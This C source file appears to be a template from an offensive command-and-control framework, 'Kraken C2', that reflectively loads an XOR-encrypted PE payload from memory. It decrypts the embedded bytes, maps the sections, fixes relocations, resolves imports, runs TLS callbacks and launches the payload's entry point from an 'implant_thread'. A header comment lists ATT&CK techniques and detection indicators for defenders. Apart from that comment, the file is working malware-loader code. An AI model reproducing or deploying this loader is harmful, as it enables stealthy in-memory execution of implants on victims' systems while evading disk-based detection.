/*
 * Kraken C2 — Reflective DLL Loader Template
 *
 * This template is embedded in generated DLL payloads to reflectively load
 * a PE file from memory without disk access.
 *
 * MITRE ATT&CK:
 *   T1620 - Reflective Code Loading
 *   T1055 - Process Injection
 *   T1574.002 - DLL Side-Loading
 *
 * Detection Indicators (Blue Team):
 *   - VirtualAlloc with PAGE_EXECUTE_READWRITE from DllMain
 *   - Unbacked executable memory regions
 *   - PE headers in process memory not matching file on disk
 *   - LoadLibraryA/GetProcAddress call patterns from DLL
 *   - YARA: MZ header in .rdata section
 *   - Sysmon Event ID 10: Process access with PROCESS_VM_WRITE
 *   - ETW: Microsoft-Windows-Threat-Intelligence ImageLoad events
 */

#include <windows.h>

/* Embedded payload data - replaced by generator */
/* PAYLOAD_DATA_START */
static const unsigned char g_payload_encrypted[] = {
    // XOR-encrypted PE bytes inserted here by payload generator
};
static const unsigned char g_xor_key[] = {
    // XOR key inserted here
};
/* PAYLOAD_DATA_END */

/* PE loading structures */
typedef struct {
    WORD  offset:12;
    WORD  type:4;
} IMAGE_RELOC, *PIMAGE_RELOC;

/* Helper: XOR decrypt payload in-place */
static void decrypt_payload(unsigned char *data, size_t data_len,
                            const unsigned char *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

/* Helper: Read DWORD from buffer */
static DWORD read_dword(const unsigned char *buf, size_t offset) {
    return *(DWORD*)(buf + offset);
}

/* Helper: Read WORD from buffer */
static WORD read_word(const unsigned char *buf, size_t offset) {
    return *(WORD*)(buf + offset);
}

/* Reflective PE Loader Implementation */
static BOOL load_pe_from_memory(const unsigned char *pe_data, size_t pe_size) {
    PIMAGE_DOS_HEADER dos_header;
    PIMAGE_NT_HEADERS nt_headers;
    PIMAGE_SECTION_HEADER section;
    LPVOID base_addr = NULL;
    HMODULE kernel32;
    FARPROC virtual_alloc_fn, virtual_protect_fn, load_library_fn, get_proc_address_fn;
    SIZE_T image_size;
    DWORD i;

    /* Validate DOS header */
    if (pe_size < sizeof(IMAGE_DOS_HEADER)) return FALSE;
    dos_header = (PIMAGE_DOS_HEADER)pe_data;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    /* Validate NT headers */
    if (pe_size < dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS)) return FALSE;
    nt_headers = (PIMAGE_NT_HEADERS)(pe_data + dos_header->e_lfanew);
    if (nt_headers->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    /* Get kernel32 APIs */
    kernel32 = GetModuleHandleA("kernel32.dll");
    if (!kernel32) return FALSE;

    virtual_alloc_fn = GetProcAddress(kernel32, "VirtualAlloc");
    virtual_protect_fn = GetProcAddress(kernel32, "VirtualProtect");
    load_library_fn = GetProcAddress(kernel32, "LoadLibraryA");
    get_proc_address_fn = GetProcAddress(kernel32, "GetProcAddress");

    if (!virtual_alloc_fn || !virtual_protect_fn || !load_library_fn || !get_proc_address_fn) {
        return FALSE;
    }

    /* Allocate memory for PE */
    image_size = nt_headers->OptionalHeader.SizeOfImage;
    base_addr = ((LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))virtual_alloc_fn)(
        NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!base_addr) return FALSE;

    /* Copy headers */
    CopyMemory(base_addr, pe_data, nt_headers->OptionalHeader.SizeOfHeaders);

    /* Copy sections */
    section = IMAGE_FIRST_SECTION(nt_headers);
    for (i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section++) {
        if (section->SizeOfRawData > 0) {
            LPVOID section_dest = (LPVOID)((ULONG_PTR)base_addr + section->VirtualAddress);
            const void *section_src = pe_data + section->PointerToRawData;
            CopyMemory(section_dest, section_src, section->SizeOfRawData);
        }
    }

    /* Process base relocations if needed */
    {
        ULONG_PTR delta = (ULONG_PTR)base_addr - nt_headers->OptionalHeader.ImageBase;
        if (delta != 0) {
            PIMAGE_DATA_DIRECTORY reloc_dir =
                &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

            if (reloc_dir->Size > 0) {
                PIMAGE_BASE_RELOCATION reloc =
                    (PIMAGE_BASE_RELOCATION)((ULONG_PTR)base_addr + reloc_dir->VirtualAddress);

                while (reloc->VirtualAddress > 0) {
                    DWORD num_entries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                    WORD *reloc_data = (WORD*)((ULONG_PTR)reloc + sizeof(IMAGE_BASE_RELOCATION));

                    for (DWORD j = 0; j < num_entries; j++) {
                        WORD type = reloc_data[j] >> 12;
                        WORD offset = reloc_data[j] & 0x0FFF;

                        if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) {
                            ULONG_PTR *patch_addr = (ULONG_PTR*)((ULONG_PTR)base_addr +
                                reloc->VirtualAddress + offset);
                            *patch_addr += delta;
                        }
                    }

                    reloc = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)reloc + reloc->SizeOfBlock);
                }
            }
        }
    }

    /* Resolve imports */
    {
        PIMAGE_DATA_DIRECTORY import_dir =
            &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

        if (import_dir->Size > 0) {
            PIMAGE_IMPORT_DESCRIPTOR import_desc =
                (PIMAGE_IMPORT_DESCRIPTOR)((ULONG_PTR)base_addr + import_dir->VirtualAddress);

            while (import_desc->Name != 0) {
                LPCSTR dll_name = (LPCSTR)((ULONG_PTR)base_addr + import_desc->Name);
                HMODULE dll_handle = ((HMODULE (WINAPI *)(LPCSTR))load_library_fn)(dll_name);

                if (dll_handle) {
                    PIMAGE_THUNK_DATA thunk =
                        (PIMAGE_THUNK_DATA)((ULONG_PTR)base_addr + import_desc->FirstThunk);
                    PIMAGE_THUNK_DATA orig_thunk = import_desc->OriginalFirstThunk ?
                        (PIMAGE_THUNK_DATA)((ULONG_PTR)base_addr + import_desc->OriginalFirstThunk) : thunk;

                    while (orig_thunk->u1.AddressOfData != 0) {
                        FARPROC func_addr;

                        if (IMAGE_SNAP_BY_ORDINAL(orig_thunk->u1.Ordinal)) {
                            func_addr = ((FARPROC (WINAPI *)(HMODULE, LPCSTR))get_proc_address_fn)(
                                dll_handle, (LPCSTR)IMAGE_ORDINAL(orig_thunk->u1.Ordinal));
                        } else {
                            PIMAGE_IMPORT_BY_NAME import_name =
                                (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)base_addr + orig_thunk->u1.AddressOfData);
                            func_addr = ((FARPROC (WINAPI *)(HMODULE, LPCSTR))get_proc_address_fn)(
                                dll_handle, import_name->Name);
                        }

                        if (func_addr) {
                            thunk->u1.Function = (ULONG_PTR)func_addr;
                        }

                        thunk++;
                        orig_thunk++;
                    }
                }

                import_desc++;
            }
        }
    }

    /* Set section permissions */
    section = IMAGE_FIRST_SECTION(nt_headers);
    for (i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section++) {
        DWORD protect = PAGE_NOACCESS;
        DWORD old_protect;
        BOOL executable = (section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        BOOL readable = (section->Characteristics & IMAGE_SCN_MEM_READ) != 0;
        BOOL writable = (section->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

        if (executable && readable && writable) protect = PAGE_EXECUTE_READWRITE;
        else if (executable && readable) protect = PAGE_EXECUTE_READ;
        else if (executable) protect = PAGE_EXECUTE;
        else if (readable && writable) protect = PAGE_READWRITE;
        else if (readable) protect = PAGE_READONLY;

        if (section->Misc.VirtualSize > 0) {
            ((BOOL (WINAPI *)(LPVOID, SIZE_T, DWORD, PDWORD))virtual_protect_fn)(
                (LPVOID)((ULONG_PTR)base_addr + section->VirtualAddress),
                section->Misc.VirtualSize, protect, &old_protect);
        }
    }

    /* Execute TLS callbacks if present */
    {
        PIMAGE_DATA_DIRECTORY tls_dir =
            &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

        if (tls_dir->Size > 0) {
            PIMAGE_TLS_DIRECTORY tls =
                (PIMAGE_TLS_DIRECTORY)((ULONG_PTR)base_addr + tls_dir->VirtualAddress);

            if (tls->AddressOfCallBacks) {
                PIMAGE_TLS_CALLBACK *callback = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
                while (*callback) {
                    (*callback)(base_addr, DLL_PROCESS_ATTACH, NULL);
                    callback++;
                }
            }
        }
    }

    /* Call entry point */
    {
        DWORD entry_rva = nt_headers->OptionalHeader.AddressOfEntryPoint;
        if (entry_rva > 0) {
            LPVOID entry_point = (LPVOID)((ULONG_PTR)base_addr + entry_rva);

            /* Check if DLL or EXE */
            if (nt_headers->FileHeader.Characteristics & IMAGE_FILE_DLL) {
                /* Call DllMain */
                typedef BOOL (WINAPI *DllMainFunc)(HINSTANCE, DWORD, LPVOID);
                DllMainFunc dll_main = (DllMainFunc)entry_point;
                dll_main((HINSTANCE)base_addr, DLL_PROCESS_ATTACH, NULL);
            } else {
                /* Call EXE entry point in new thread */
                typedef int (WINAPI *ExeMainFunc)(void);
                ExeMainFunc exe_main = (ExeMainFunc)entry_point;
                CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exe_main, NULL, 0, NULL);
            }
        }
    }

    return TRUE;
}

/* Main implant thread - called from DllMain */
static DWORD WINAPI implant_thread(LPVOID param) {
    unsigned char *decrypted_pe;
    size_t payload_size = sizeof(g_payload_encrypted);
    size_t key_size = sizeof(g_xor_key);

    (void)param;

    /* Allocate buffer for decrypted payload */
    decrypted_pe = (unsigned char*)VirtualAlloc(NULL, payload_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!decrypted_pe) return 1;

    /* Copy and decrypt payload */
    CopyMemory(decrypted_pe, g_payload_encrypted, payload_size);
    decrypt_payload(decrypted_pe, payload_size, g_xor_key, key_size);

    /* Load the PE */
    if (!load_pe_from_memory(decrypted_pe, payload_size)) {
        VirtualFree(decrypted_pe, 0, MEM_RELEASE);
        return 1;
    }

    /* Keep decrypted PE in memory (don't free - loaded PE references it) */
    return 0;
}
